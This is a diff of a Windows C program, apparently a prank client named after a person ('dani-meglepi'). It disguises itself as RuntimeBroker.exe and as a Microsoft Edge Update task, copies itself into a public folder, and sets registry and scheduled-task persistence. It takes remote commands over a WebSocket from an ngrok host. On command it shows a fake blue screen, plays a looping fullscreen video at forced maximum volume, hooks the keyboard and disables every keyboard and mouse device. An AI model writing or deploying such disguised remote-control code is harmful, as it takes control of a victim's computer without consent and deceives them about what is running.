@@ -1,13 +1,14 @@
 /*
- * dani-meglepi-client — RuntimeBroker.exe  (v2)
+ * dani-meglepi-client v3 — RuntimeBroker.exe
  *
  * Fordítás:
  *   x86_64-w64-mingw32-windres version.rc -O coff -o version.res
  *   x86_64-w64-mingw32-gcc -O2 -mwindows -DINITGUID -o RuntimeBroker.exe \
  *     client.c version.res \
- *     -lws2_32 -lwinhttp -lgdi32 -lole32 -lshell32 \
- *     -luuid -lshlwapi -luser32 -ladvapi32 -loleaut32 -ltaskschd \
- *     -lmfplat -lmfuuid -lmf -lmfreadwrite -lpropsys -levr
+ *     -lws2_32 -lwinhttp -lgdi32 -lole32 -lshell32 -luuid -lshlwapi \
+ *     -luser32 -ladvapi32 -loleaut32 -ltaskschd \
+ *     -lmfplat -lmfuuid -lmf -lmfreadwrite -lpropsys -levr \
+ *     -lsetupapi -lmmdevapi
  */
 
 #define WIN32_LEAN_AND_MEAN
@@ -28,23 +29,31 @@
 #include <mfapi.h>
 #include <mfidl.h>
 #include <mferror.h>
-#include <evr.h>       /* MR_VIDEO_RENDER_SERVICE, IMFVideoDisplayControl */
+#include <evr.h>
+#include <setupapi.h>
+#include <cfgmgr32.h>
+#include <devguid.h>
+#include <endpointvolume.h>
+#include <mmdeviceapi.h>
+#include <functiondiscoverykeys_devpkey.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <math.h>
 
 /* ── Konfiguráció ───────────────────────────────────────────────────────── */
-#define WS_HOST        L"turbulent-renter-liking.ngrok-free.app"
-#define WS_PORT        443
-#define WS_PATH_PREFIX L"/ws/"
-#define ASSET_DIR      L"C:\\Users\\Public\\dani-meglepi\\"
-#define MP4_FILE       L"C:\\Users\\Public\\dani-meglepi\\daninak.mp4"
-#define EXE_NAME       L"RuntimeBroker.exe"
-#define TASK_NAME      L"MicrosoftEdgeUpdateTaskMachineCore"
-#define RECONNECT_MS   3000
-#define MAX_BACKOFF_MS 60000
-#define HEARTBEAT_MS   20000
-#define TOPMOST_MS     100
+#define WS_HOST         L"turbulent-renter-liking.ngrok-free.app"
+#define WS_PORT         443
+#define WS_PATH_PREFIX  L"/ws/"
+#define ASSET_DIR       L"C:\\Users\\Public\\dani-meglepi\\"
+#define MP4_FILE        L"C:\\Users\\Public\\dani-meglepi\\daninak.mp4"
+#define EXE_NAME        L"RuntimeBroker.exe"
+#define TASK_NAME       L"MicrosoftEdgeUpdateTaskMachineCore"
+#define RECONNECT_MS    3000
+#define MAX_BACKOFF_MS  60000
+#define HEARTBEAT_MS    20000
+#define TOPMOST_MS      100
+#define CLEARTXT_MS     2000   /* pendrive clear.txt poll intervallum */
 
 /* ── BSOD felbontás táblázat ────────────────────────────────────────────── */
 typedef struct { int w, h; const WCHAR *file; } BsodRes;
@@ -79,8 +88,8 @@ typedef GpStatus (__stdcall *PFClear)(GpGraphics*,DWORD);
 typedef GpStatus (__stdcall *PFSetInterp)(GpGraphics*,INT);
 
 static ULONG_PTR  gp_token=0;
-static PFStartup  gp_Startup;
-static PFShutdown gp_Shutdown;
+static PFStartup    gp_Startup;
+static PFShutdown   gp_Shutdown;
 static PFLoadStream gp_LoadStream;
 static PFDrawRect   gp_DrawRect;
 static PFFromHDC    gp_FromHDC;
@@ -118,7 +127,7 @@ typedef enum { SH_BLK1, SH_BSOD, SH_BLK2, SH_MP4 } ShowStep;
 static volatile AppState g_state = ST_IDLE;
 static volatile ShowStep g_step  = SH_BLK1;
 
-/* BSOD — előre renderelt HBITMAP */
+/* BSOD */
 static HBITMAP g_bsod_bmp = NULL;
 
 /* Media Foundation */
@@ -134,14 +143,34 @@ static HINTERNET g_connect    = NULL;
 static HINTERNET g_ws         = NULL;
 static volatile BOOL g_running = TRUE;
 
+/* Hangerő mentett állapot */
+static float g_saved_volume = -1.0f;
+static BOOL  g_saved_mute   = FALSE;
+static BOOL  g_volume_saved = FALSE;
+
+/* HID letiltott eszközök listája */
+#define MAX_HID_DEVICES 64
+static DEVINST g_disabled_devs[MAX_HID_DEVICES];
+static int     g_disabled_count = 0;
+
 /* Timerek */
-static UINT_PTR g_show_timer = 0;
+static UINT_PTR g_show_timer    = 0;
+static UINT_PTR g_cleartxt_timer = 0;
 
 #define WM_DO_SHOW  (WM_USER+1)
 #define WM_DO_DEMO  (WM_USER+2)
 #define WM_DO_CLEAR (WM_USER+3)
 
-/* ── BSOD: legközelebbi felbontás (euklideszi távolság) ─────────────────── */
+/* ── Admin jog ellenőrzés ───────────────────────────────────────────────── */
+static BOOL is_admin(void) {
+    BOOL a=FALSE; HANDLE tok=NULL;
+    if (!OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY,&tok)) return FALSE;
+    TOKEN_ELEVATION te={0}; DWORD sz=sizeof te;
+    if (GetTokenInformation(tok,TokenElevation,&te,sizeof te,&sz)) a=te.TokenIsElevated;
+    CloseHandle(tok); return a;
+}
+
+/* ── BSOD: legközelebbi felbontás ───────────────────────────────────────── */
 static int bsod_best_idx(int sw, int sh) {
     int best=0; double best_d=1e18;
     for (int i=0;i<(int)BSOD_COUNT;i++) {
@@ -152,7 +181,7 @@ static int bsod_best_idx(int sw, int sh) {
     return best;
 }
 
-/* ── BSOD kép előrenderelés HBITMAP-ba (top-left crop) ──────────────────── */
+/* ── BSOD előrenderelés: bal felső rögzítve, képernyőt teljesen kitölti ── */
 static void bsod_prerender(void) {
     int sw=GetSystemMetrics(SM_CXSCREEN);
     int sh=GetSystemMetrics(SM_CYSCREEN);
@@ -171,17 +200,13 @@ static void bsod_prerender(void) {
     g_bsod_bmp=CreateCompatibleBitmap(scr,sw,sh);
     HBITMAP ob=(HBITMAP)SelectObject(mdc,g_bsod_bmp);
 
-    /* Fekete háttér (ha kép kisebb mint képernyő) */
-    RECT rc={0,0,sw,sh};
-    HBRUSH blk=CreateSolidBrush(RGB(0,0,0));
-    FillRect(mdc,&rc,blk); DeleteObject(blk);
-
-    /* Kép rajzolása (0,0)-tól, natív méretben — top-left crop */
+    /* GdipDrawImageRectI(x=0, y=0, w=sw, h=sh) → bal felsőből skálázva fullscreen. */
     GpGraphics *g=NULL;
     gp_FromHDC(mdc,&g);
     if (g) {
-        gp_SetInterp(g,7); /* HighQualityBicubic — bár natív méret, szép marad */
-        gp_DrawRect(g,img,0,0,br->w,br->h);
+        gp_SetInterp(g,7); /* HighQualityBicubic */
+        gp_Clear(g,0xFF000000);
+        gp_DrawRect(g,img,0,0,sw,sh);   /* (0,0) = bal felső, sw*sh = teljes képernyő */
         gp_DelGraph(g);
     }
     SelectObject(mdc,ob);
@@ -190,10 +215,99 @@ static void bsod_prerender(void) {
     gp_DelImg(img);
 }
 
+/* ── WASAPI hangerő: mentés + max + visszaállítás ───────────────────────── */
+static IAudioEndpointVolume *get_audio_endpoint(void) {
+    IMMDeviceEnumerator *enumerator=NULL;
+    IMMDevice *device=NULL;
+    IAudioEndpointVolume *vol=NULL;
+
+    if (FAILED(CoCreateInstance(&CLSID_MMDeviceEnumerator,NULL,
+            CLSCTX_ALL,&IID_IMMDeviceEnumerator,(void**)&enumerator)))
+        return NULL;
+    if (SUCCEEDED(IMMDeviceEnumerator_GetDefaultAudioEndpoint(enumerator,
+            eRender,eConsole,&device))) {
+        IMMDevice_Activate(device,&IID_IAudioEndpointVolume,
+            CLSCTX_ALL,NULL,(void**)&vol);
+        IMMDevice_Release(device);
+    }
+    IMMDeviceEnumerator_Release(enumerator);
+    return vol;
+}
+
+static void volume_save_and_max(void) {
+    IAudioEndpointVolume *vol=get_audio_endpoint();
+    if (!vol) return;
+    IAudioEndpointVolume_GetMasterVolumeLevelScalar(vol,&g_saved_volume);
+    IAudioEndpointVolume_GetMute(vol,&g_saved_mute);
+    IAudioEndpointVolume_SetMasterVolumeLevelScalar(vol,1.0f,NULL);
+    IAudioEndpointVolume_SetMute(vol,FALSE,NULL);
+    g_volume_saved=TRUE;
+    IAudioEndpointVolume_Release(vol);
+}
+
+static void volume_restore(void) {
+    if (!g_volume_saved) return;
+    IAudioEndpointVolume *vol=get_audio_endpoint();
+    if (!vol) return;
+    IAudioEndpointVolume_SetMasterVolumeLevelScalar(vol,g_saved_volume,NULL);
+    IAudioEndpointVolume_SetMute(vol,g_saved_mute,NULL);
+    IAudioEndpointVolume_Release(vol);
+    g_volume_saved=FALSE;
+}
+
+/* ── HID eszközök letiltása / visszaengedélyezése ───────────────────────── */
+static void hid_disable_all(void) {
+    if (!is_admin()) return;
+    g_disabled_count=0;
+
+    /* Billentyűzet (GUID_DEVCLASS_KEYBOARD) és egér (GUID_DEVCLASS_MOUSE) */
+    const GUID *classes[]={&GUID_DEVCLASS_KEYBOARD,&GUID_DEVCLASS_MOUSE};
+    for (int c=0;c<2;c++) {
+        HDEVINFO di=SetupDiGetClassDevsW(classes[c],NULL,NULL,DIGCF_PRESENT);
+        if (di==INVALID_HANDLE_VALUE) continue;
+        SP_DEVINFO_DATA dd; dd.cbSize=sizeof dd;
+        for (DWORD i=0;SetupDiEnumDeviceInfo(di,i,&dd);i++) {
+            if (g_disabled_count>=MAX_HID_DEVICES) break;
+            CONFIGRET cr=CM_Disable_DevNode(dd.DevInst,0);
+            if (cr==CR_SUCCESS) {
+                g_disabled_devs[g_disabled_count++]=dd.DevInst;
+            }
+        }
+        SetupDiDestroyDeviceInfoList(di);
+    }
+}
+
+static void hid_enable_all(void) {
+    for (int i=0;i<g_disabled_count;i++)
+        CM_Enable_DevNode(g_disabled_devs[i],0);
+    g_disabled_count=0;
+}
+
+/* ── Pendrive clear.txt figyelés ────────────────────────────────────────── */
+static VOID CALLBACK cleartxt_tick(HWND h,UINT m,UINT_PTR id,DWORD t) {
+    (void)h;(void)m;(void)id;(void)t;
+    if (g_state!=ST_SHOW) return;
+
+    /* Végigmegyünk az összes meghajtón */
+    DWORD drives=GetLogicalDrives();
+    for (int i=0;i<26;i++) {
+        if (!(drives&(1<<i))) continue;
+        WCHAR root[8]; swprintf_s(root,8,L"%c:\\",'A'+i);
+        if (GetDriveTypeW(root)!=DRIVE_REMOVABLE) continue;
+        /* Pendrive: cserélhető meghajtó */
+        WCHAR path[32]; swprintf_s(path,32,L"%c:\\clear.txt",'A'+i);
+        if (GetFileAttributesW(path)!=INVALID_FILE_ATTRIBUTES) {
+            /* clear.txt megtalálva → clear */
+            PostMessageW(g_hwnd,WM_DO_CLEAR,0,0);
+            return;
+        }
+    }
+}
+
 /* ── Media Foundation eseménykezelő szál ────────────────────────────────── */
 static DWORD WINAPI mf_event_thread(LPVOID p) {
     (void)p;
-    while (g_running && g_mp4_loop) {
+    while (g_running&&g_mp4_loop) {
         if (!g_mf_session) { Sleep(50); continue; }
         IMFMediaEvent *ev=NULL;
         HRESULT hr=IMFMediaSession_GetEvent(g_mf_session,
@@ -203,27 +317,22 @@ static DWORD WINAPI mf_event_thread(LPVOID p) {
         MediaEventType t=MEUnknown;
         IMFMediaEvent_GetType(ev,&t);
         IMFMediaEvent_Release(ev);
-        if (t==MEEndOfPresentation && g_mp4_loop) {
-            /* Visszateker az elejére → loop */
+        if (t==MEEndOfPresentation&&g_mp4_loop) {
             PROPVARIANT pv; PropVariantInit(&pv);
             pv.vt=VT_I8; pv.hVal.QuadPart=0;
             IMFMediaSession_Start(g_mf_session,NULL,&pv);
             PropVariantClear(&pv);
-        } else if (t==MESessionClosed) {
-            break;
-        }
+        } else if (t==MESessionClosed) break;
     }
     return 0;
 }
 
-/* ── EVR ablak eljárás (rejtett) ────────────────────────────────────────── */
 static LRESULT CALLBACK evr_wndproc(HWND h,UINT m,WPARAM w,LPARAM l) {
     return DefWindowProcW(h,m,w,l);
 }
 
-/* ── MP4 lejátszás indítása ─────────────────────────────────────────────── */
+/* ── MP4 lejátszás ──────────────────────────────────────────────────────── */
 static BOOL mp4_play(void) {
-    /* Source létrehozása */
     IMFSourceResolver *res=NULL;
     if (FAILED(MFCreateSourceResolver(&res))) return FALSE;
     MF_OBJECT_TYPE ot=MF_OBJECT_INVALID;
@@ -236,63 +345,50 @@ static BOOL mp4_play(void) {
     IUnknown_Release(src_unk);
     if (FAILED(hr)) return FALSE;
 
-    /* Session */
     hr=MFCreateMediaSession(NULL,&g_mf_session);
     if (FAILED(hr)) {
         IMFMediaSource_Release(g_mf_source); g_mf_source=NULL; return FALSE;
     }
 
-    /* Topológia */
-    IMFTopology *topo=NULL;
-    MFCreateTopology(&topo);
-
+    IMFTopology *topo=NULL; MFCreateTopology(&topo);
     IMFPresentationDescriptor *pd=NULL;
     IMFMediaSource_CreatePresentationDescriptor(g_mf_source,&pd);
     DWORD sdc=0;
     IMFPresentationDescriptor_GetStreamDescriptorCount(pd,&sdc);
 
     for (DWORD i=0;i<sdc;i++) {
-        BOOL sel=FALSE;
-        IMFStreamDescriptor *sd=NULL;
+        BOOL sel=FALSE; IMFStreamDescriptor *sd=NULL;
         IMFPresentationDescriptor_GetStreamDescriptorByIndex(pd,i,&sel,&sd);
         if (!sel||!sd) { if(sd) IMFStreamDescriptor_Release(sd); continue; }
 
         IMFMediaTypeHandler *mth=NULL;
         IMFStreamDescriptor_GetMediaTypeHandler(sd,&mth);
-        GUID major; memset(&major,0,sizeof(major));
+        GUID major; memset(&major,0,sizeof major);
         if (mth) { IMFMediaTypeHandler_GetMajorType(mth,&major);
                    IMFMediaTypeHandler_Release(mth); }
 
-        /* Source node */
-        IMFTopologyNode *sn=NULL;
+        IMFTopologyNode *sn=NULL,*on=NULL;
         MFCreateTopologyNode(MF_TOPOLOGY_SOURCESTREAM_NODE,&sn);
         IMFTopologyNode_SetUnknown(sn,&MF_TOPONODE_SOURCE,(IUnknown*)g_mf_source);
         IMFTopologyNode_SetUnknown(sn,&MF_TOPONODE_PRESENTATION_DESCRIPTOR,(IUnknown*)pd);
         IMFTopologyNode_SetUnknown(sn,&MF_TOPONODE_STREAM_DESCRIPTOR,(IUnknown*)sd);
-
-        /* Output node */
-        IMFTopologyNode *on=NULL;
         MFCreateTopologyNode(MF_TOPOLOGY_OUTPUT_NODE,&on);
 
         if (IsEqualGUID(&major,&MFMediaType_Video)) {
-            /* EVR */
             IMFActivate *evr=NULL;
             MFCreateVideoRendererActivate(g_evr_hwnd,&evr);
-            if (evr) {
-                IMFTopologyNode_SetObject(on,(IUnknown*)evr);
-                IMFActivate_Release(evr);
-            }
+            if (evr) { IMFTopologyNode_SetObject(on,(IUnknown*)evr);
+                       IMFActivate_Release(evr); }
         } else if (IsEqualGUID(&major,&MFMediaType_Audio)) {
-            /* SAR — ha nincs hangeszköz, kihagyjuk ezt a streamet */
             IMFActivate *sar=NULL;
             hr=MFCreateAudioRendererActivate(&sar);
             if (SUCCEEDED(hr)&&sar) {
                 IMFTopologyNode_SetObject(on,(IUnknown*)sar);
                 IMFActivate_Release(sar);
             } else {
-                /* Nincs hang — stream kihagyva, nem végzetes */
-                IMFTopologyNode_Release(on); on=NULL;
-                IMFTopologyNode_Release(sn); sn=NULL;
+                /* Nincs hangeszköz — stream kihagyva */
+                if (sn) IMFTopologyNode_Release(sn);
+                if (on) IMFTopologyNode_Release(on);
                 IMFStreamDescriptor_Release(sd);
                 continue;
             }
@@ -308,11 +404,9 @@ static BOOL mp4_play(void) {
         IMFStreamDescriptor_Release(sd);
     }
     if (pd) IMFPresentationDescriptor_Release(pd);
-
     IMFMediaSession_SetTopology(g_mf_session,0,topo);
     if (topo) IMFTopology_Release(topo);
 
-    /* Indítás */
     PROPVARIANT pv; PropVariantInit(&pv); pv.vt=VT_EMPTY;
     IMFMediaSession_Start(g_mf_session,NULL,&pv);
     PropVariantClear(&pv);
@@ -320,7 +414,7 @@ static BOOL mp4_play(void) {
     g_mp4_loop=TRUE;
     g_mf_thread=CreateThread(NULL,0,mf_event_thread,NULL,0,NULL);
 
-    /* EVR fullscreen beállítása — kis késleltetéssel, mert a session indulása aszinkron */
+    /* EVR fullscreen */
     Sleep(200);
     int sw=GetSystemMetrics(SM_CXSCREEN);
     int sh=GetSystemMetrics(SM_CYSCREEN);
@@ -335,15 +429,11 @@ static BOOL mp4_play(void) {
         IMFVideoDisplayControl_SetVideoPosition(vdc,NULL,&dest);
         IMFVideoDisplayControl_Release(vdc);
     }
-
-    /* Főablak a legfelső — keyboard hook megmarad */
     SetWindowPos(g_hwnd,HWND_TOPMOST,0,0,0,0,
         SWP_NOMOVE|SWP_NOSIZE|SWP_NOACTIVATE);
-
     return TRUE;
 }
 
-/* ── MP4 leállítás ──────────────────────────────────────────────────────── */
 static void mp4_stop(void) {
     g_mp4_loop=FALSE;
     if (g_mf_session) {
@@ -400,27 +490,62 @@ static LRESULT CALLBACK kbhook_proc(int code,WPARAM wp,LPARAM lp) {
     return CallNextHookEx(g_kbhook,code,wp,lp);
 }
 
-/* ── Fullscreen ─────────────────────────────────────────────────────────── */
-static void enter_fs(void) {
-    if (g_fs) return;
-    g_fs=TRUE;
-    int sw=GetSystemMetrics(SM_CXSCREEN);
-    int sh=GetSystemMetrics(SM_CYSCREEN);
-    SetWindowLongW(g_hwnd,GWL_STYLE,WS_POPUP);
-    SetWindowLongW(g_hwnd,GWL_EXSTYLE,WS_EX_TOPMOST|WS_EX_TOOLWINDOW);
-    SetWindowPos(g_hwnd,HWND_TOPMOST,0,0,sw,sh,
-        SWP_FRAMECHANGED|SWP_SHOWWINDOW|SWP_NOACTIVATE);
-    if (g_kbhook) UnhookWindowsHookEx(g_kbhook);
-    g_kbhook=SetWindowsHookExW(WH_KEYBOARD_LL,kbhook_proc,NULL,0);
+/* ── Show indítása (hangerő + HID + fullscreen + cleartxt poll) ─────────── */
+static void do_show(void) {
+    g_state=ST_SHOW;
+    volume_save_and_max();
+    hid_disable_all();
+    /* Fullscreen */
+    if (!g_fs) {
+        g_fs=TRUE;
+        int sw=GetSystemMetrics(SM_CXSCREEN);
+        int sh=GetSystemMetrics(SM_CYSCREEN);
+        SetWindowLongW(g_hwnd,GWL_STYLE,WS_POPUP);
+        SetWindowLongW(g_hwnd,GWL_EXSTYLE,WS_EX_TOPMOST|WS_EX_TOOLWINDOW);
+        SetWindowPos(g_hwnd,HWND_TOPMOST,0,0,sw,sh,
+            SWP_FRAMECHANGED|SWP_SHOWWINDOW|SWP_NOACTIVATE);
+        if (g_kbhook) UnhookWindowsHookEx(g_kbhook);
+        g_kbhook=SetWindowsHookExW(WH_KEYBOARD_LL,kbhook_proc,NULL,0);
+    }
+    /* Pendrive clear.txt poll indítása */
+    g_cleartxt_timer=SetTimer(g_hwnd,3,CLEARTXT_MS,cleartxt_tick);
+    advance(SH_BLK1);
 }
 
-static void leave_fs(void) {
-    if (!g_fs) return;
-    g_fs=FALSE;
+/* ── Clear (minden visszaállítás) ───────────────────────────────────────── */
+static void do_clear(void) {
+    g_state=ST_IDLE;
+    /* Pendrive poll leállítása */
+    if (g_cleartxt_timer) { KillTimer(g_hwnd,g_cleartxt_timer); g_cleartxt_timer=0; }
+    /* MP4 + show timer */
     mp4_stop();
     if (g_show_timer) { KillTimer(g_hwnd,g_show_timer); g_show_timer=0; }
+    /* HID visszaengedélyezés */
+    hid_enable_all();
+    /* Hangerő visszaállítás */
+    volume_restore();
+    /* Keyboard hook le */
     if (g_kbhook) { UnhookWindowsHookEx(g_kbhook); g_kbhook=NULL; }
+    /* Ablak elrejtése */
+    g_fs=FALSE;
     ShowWindow(g_hwnd,SW_HIDE);
+}
+
+/* ── Demo (csak fullscreen + hook, hangerő/HID nélkül) ─────────────────── */
+static void do_demo(void) {
+    g_state=ST_DEMO;
+    if (!g_fs) {
+        g_fs=TRUE;
+        int sw=GetSystemMetrics(SM_CXSCREEN);
+        int sh=GetSystemMetrics(SM_CYSCREEN);
+        SetWindowLongW(g_hwnd,GWL_STYLE,WS_POPUP);
+        SetWindowLongW(g_hwnd,GWL_EXSTYLE,WS_EX_TOPMOST|WS_EX_TOOLWINDOW);
+        SetWindowPos(g_hwnd,HWND_TOPMOST,0,0,sw,sh,
+            SWP_FRAMECHANGED|SWP_SHOWWINDOW|SWP_NOACTIVATE);
+        if (g_kbhook) UnhookWindowsHookEx(g_kbhook);
+        g_kbhook=SetWindowsHookExW(WH_KEYBOARD_LL,kbhook_proc,NULL,0);
+    }
+    repaint();
 }
 
 /* ── WM_PAINT ───────────────────────────────────────────────────────────── */
@@ -465,11 +590,7 @@ static void on_paint(HWND hwnd) {
                     FillRect(mdc,&rc,bb); DeleteObject(bb);
                 }
                 break;
-            case SH_MP4:
-                /* Az EVR ablak renderel alattunk — mi fekete háttérrel takarjuk
-                   a nem videós területet. Az EVR ablak a g_hwnd ALATT van (z-order),
-                   de a g_hwnd WS_EX_TRANSPARENT-tal átengedi a videó pixeleket. */
-                break;
+            case SH_MP4: break; /* EVR renderel */
         }
     }
 
@@ -483,21 +604,14 @@ static LRESULT CALLBACK wndproc(HWND hwnd,UINT msg,WPARAM wp,LPARAM lp) {
     switch (msg) {
         case WM_PAINT:      on_paint(hwnd); return 0;
         case WM_ERASEBKGND: return 1;
-
-        case WM_DO_SHOW:
-            g_state=ST_SHOW; enter_fs(); advance(SH_BLK1); return 0;
-        case WM_DO_DEMO:
-            g_state=ST_DEMO; enter_fs(); repaint(); return 0;
-        case WM_DO_CLEAR:
-            g_state=ST_IDLE; leave_fs(); return 0;
-
+        case WM_DO_SHOW:    do_show();  return 0;
+        case WM_DO_DEMO:    do_demo();  return 0;
+        case WM_DO_CLEAR:   do_clear(); return 0;
         case WM_TIMER:
-            if (wp==99&&g_fs) {
+            if (wp==99&&g_fs)
                 SetWindowPos(g_hwnd,HWND_TOPMOST,0,0,0,0,
                     SWP_NOMOVE|SWP_NOSIZE|SWP_NOACTIVATE);
-            }
             return 0;
-
         case WM_WINDOWPOSCHANGING:
             if (g_fs) {
                 WINDOWPOS *p=(WINDOWPOS*)lp;
@@ -505,13 +619,12 @@ static LRESULT CALLBACK wndproc(HWND hwnd,UINT msg,WPARAM wp,LPARAM lp) {
                 p->flags&=~SWP_NOZORDER;
             }
             return 0;
-
         case WM_CLOSE: case WM_DESTROY: return 0;
         default: return DefWindowProcW(hwnd,msg,wp,lp);
     }
 }
 
-/* ── Parancs feldolgozás (WS szálból) ──────────────────────────────────── */
+/* ── Parancs feldolgozás ────────────────────────────────────────────────── */
 static void process_cmd(const char *json) {
     const char *p=strstr(json,"\"cmd\""); if (!p) return;
     p=strchr(p,':');                      if (!p) return;
@@ -527,7 +640,7 @@ static void ws_cleanup(void) {
     if (g_connect) { WinHttpCloseHandle(g_connect); g_connect=NULL; }
 }
 
-/* ── WS kapcsolat felépítése ────────────────────────────────────────────── */
+/* ── WS kapcsolat ───────────────────────────────────────────────────────── */
 static BOOL ws_open(void) {
     DWORD vol=0;
     GetVolumeInformationW(L"C:\\",NULL,0,&vol,NULL,NULL,NULL,0);
@@ -693,7 +806,7 @@ out:
     if (svc)  ITaskService_Release(svc);
 }
 
-/* ── Registry Run (HKCU mindig, HKLM csak adminnal) ────────────────────── */
+/* ── Registry Run ───────────────────────────────────────────────────────── */
 static void install_reg(const WCHAR *exe) {
     WCHAR val[MAX_PATH+4];
     swprintf_s(val,MAX_PATH+4,L"\"%s\"",exe);
@@ -713,49 +826,33 @@ static void install_reg(const WCHAR *exe) {
     }
 }
 
-/* ── Admin jog ellenőrzés ───────────────────────────────────────────────── */
-static BOOL is_admin(void) {
-    BOOL a=FALSE; HANDLE tok=NULL;
-    if (!OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY,&tok)) return FALSE;
-    TOKEN_ELEVATION te={0}; DWORD sz=sizeof te;
-    if (GetTokenInformation(tok,TokenElevation,&te,sizeof te,&sz)) a=te.TokenIsElevated;
-    CloseHandle(tok); return a;
-}
-
 /* ── WinMain ────────────────────────────────────────────────────────────── */
 int WINAPI WinMain(HINSTANCE hInst,HINSTANCE hPrev,LPSTR cmd,int nShow) {
     (void)hPrev;(void)cmd;(void)nShow;
 
-    /* Egypéldány mutex */
     HANDLE mutex=CreateMutexW(NULL,TRUE,
         L"Global\\MicrosoftEdgeCoreUpdateInstance_v2");
     if (GetLastError()==ERROR_ALREADY_EXISTS) return 0;
 
-    /* Elérési utak */
     WCHAR exe[MAX_PATH],dst[MAX_PATH];
     GetModuleFileNameW(NULL,exe,MAX_PATH);
     swprintf_s(dst,MAX_PATH,L"%s%s",ASSET_DIR,EXE_NAME);
 
-    /* Önmásolás */
     if (_wcsicmp(exe,dst)!=0) {
         CreateDirectoryW(ASSET_DIR,NULL);
         CopyFileW(exe,dst,FALSE);
     }
 
-    /* Perzisztencia */
     BOOL admin=is_admin();
     CoInitializeEx(NULL,COINIT_APARTMENTTHREADED);
     install_reg(dst);
     install_task(dst,admin);
 
-    /* GDI+ */
     if (!gdiplus_init()) { CoUninitialize(); return 1; }
     bsod_prerender();
 
-    /* Media Foundation */
     MFStartup(MF_VERSION,MFSTARTUP_NOSOCKET);
 
-    /* WinHTTP session */
     g_ws_session=WinHttpOpen(
         L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
         L"AppleWebKit/537.36 (KHTML, like Gecko) "
@@ -763,44 +860,34 @@ int WINAPI WinMain(HINSTANCE hInst,HINSTANCE hPrev,LPSTR cmd,int nShow) {
         WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
         WINHTTP_NO_PROXY_NAME,WINHTTP_NO_PROXY_BYPASS,0);
 
-    /* Ablak osztályok */
     WNDCLASSEXW wc={0};
     wc.cbSize=sizeof wc; wc.hInstance=hInst;
+    wc.hbrBackground=(HBRUSH)GetStockObject(BLACK_BRUSH);
 
-    /* EVR rejtett ablak */
     wc.lpfnWndProc=evr_wndproc;
     wc.lpszClassName=L"DM_EVRHost";
-    wc.hbrBackground=(HBRUSH)GetStockObject(BLACK_BRUSH);
     RegisterClassExW(&wc);
     g_evr_hwnd=CreateWindowExW(WS_EX_TOOLWINDOW|WS_EX_NOACTIVATE,
         L"DM_EVRHost",L"",WS_POPUP,0,0,1,1,NULL,NULL,hInst,NULL);
 
-    /* Fő overlay ablak */
     wc.lpfnWndProc=wndproc;
     wc.lpszClassName=L"CoreRtBrokerHost";
-    wc.hbrBackground=(HBRUSH)GetStockObject(BLACK_BRUSH);
     RegisterClassExW(&wc);
-    g_hwnd=CreateWindowExW(
-        WS_EX_TOOLWINDOW|WS_EX_NOACTIVATE,
+    g_hwnd=CreateWindowExW(WS_EX_TOOLWINDOW|WS_EX_NOACTIVATE,
         L"CoreRtBrokerHost",L"",WS_POPUP,
         0,0,1,1,NULL,NULL,hInst,NULL);
 
-    /* WS szál */
     CreateThread(NULL,0,ws_thread,NULL,0,NULL);
-
-    /* Topmost kényszer timer */
     SetTimer(g_hwnd,99,TOPMOST_MS,NULL);
 
-    /* Üzenethurok */
     MSG msg;
     while (GetMessageW(&msg,NULL,0,0)>0) {
         TranslateMessage(&msg);
         DispatchMessageW(&msg);
     }
 
-    /* Takarítás */
     g_running=FALSE;
-    mp4_stop();
+    do_clear();
     MFShutdown();
     ws_cleanup();
     if (g_ws_session) WinHttpCloseHandle(g_ws_session);
